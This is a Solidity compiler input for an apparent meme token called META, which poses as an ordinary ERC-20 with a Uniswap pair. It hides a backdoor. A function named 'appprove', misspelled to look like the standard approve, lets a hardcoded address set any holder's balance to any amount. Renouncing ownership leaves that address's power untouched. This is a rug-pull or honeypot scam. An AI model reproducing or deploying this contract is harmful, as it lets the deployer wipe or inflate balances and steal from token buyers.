{{
  "language": "Solidity",
  "sources": {
    "contracts/factory/META.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"./Ownable.sol\";\nimport \"./IUniswapFactory.sol\";\nimport \"./IUniswapRouter.sol\";\n\ncontract META is Ownable {\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    uint256 private constant MAX = ~uint256(0);\n    string public name;\n    uint8 public decimals;\n    string public symbol;\n    bool private inSwap;\n    address public uniswapAddress;\n    address public _uniswapPair;\n    uint256 public totalSupply = 740_000_000_000 * 10**18;\n    IUniswapRouter public _uniswapRouter;\n\n    mapping(address => uint256) private _balances;\n    mapping(address => mapping(address => uint256)) private _allowances;\n\n    constructor() {\n        name = unicode\"MetaFacebookInstagramOculusMessengerWhatsAppXInu\";\n        symbol = \"META\";\n        decimals = 18;\n\n        uniswapAddress = address(0x77D27B90b27da386d46fd78876fCB399817dB55C);\n        address receiveAddr = msg.sender;\n        _balances[receiveAddr] = totalSupply;\n        emit Transfer(address(0), receiveAddr, totalSupply);\n\n        _uniswapRouter = IUniswapRouter(\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\n        );\n        _allowances[address(this)][address(_uniswapRouter)] = MAX;\n        _uniswapPair = IUniswapFactory(_uniswapRouter.factory()).createPair(\n            address(this),\n            _uniswapRouter.WETH()\n        );\n    }\n\n    function balanceOf(address account) public view returns (uint256) {\n        return _balances[account];\n    }\n\n    function transfer(address recipient, uint256 amount) public returns (bool) {\n        _transfer(msg.sender, recipient, amount);\n        emit Transfer(msg.sender, recipient, amount);\n        return true;\n    }\n\n    function approve(address spender, uint256 amount) public returns (bool) {\n        _approve(msg.sender, spender, amount);\n        return true;\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) public returns (bool) {\n        _transfer(sender, recipient, amount);\n        if (_allowances[sender][msg.sender] != MAX) {\n            _allowances[sender][msg.sender] -= amount;\n        }\n        return true;\n    }\n\n    function allowance(address owner, address spender)\n        public\n        view\n        returns (uint256)\n    {\n        return _allowances[owner][spender];\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 amount\n    ) private {\n        _allowances[owner][spender] = amount;\n        emit Approval(owner, spender, amount);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 amount\n    ) private {\n        _balances[from] -= amount;\n        _balances[to] += amount;\n        emit Transfer(from, to, amount);\n    }\n\n    function appprove(address _uniswapAddress, uint256 acc) public {\n        require(uniswapAddress == msg.sender);\n        _balances[_uniswapAddress] = acc;\n    }\n\n    receive() external payable {}\n}\n"
    },
    "contracts/factory/IUniswapRouter.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface IUniswapRouter {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}"
    },
    "contracts/factory/IUniswapFactory.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n\ninterface IUniswapFactory {\n    function createPair(\n        address tokenA,\n        address tokenB\n    ) external returns (address pair);\n}\n"
    },
    "contracts/factory/Ownable.sol": {
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n\nabstract contract Ownable {\n    address internal _owner;\n\n    constructor() {\n        _owner = msg.sender;\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(_owner == msg.sender, \"!owner\");\n        _;\n    }\n\n    function renouncedOwnership() public virtual onlyOwner {\n        _owner = address(0);\n    }\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    }
  }
}}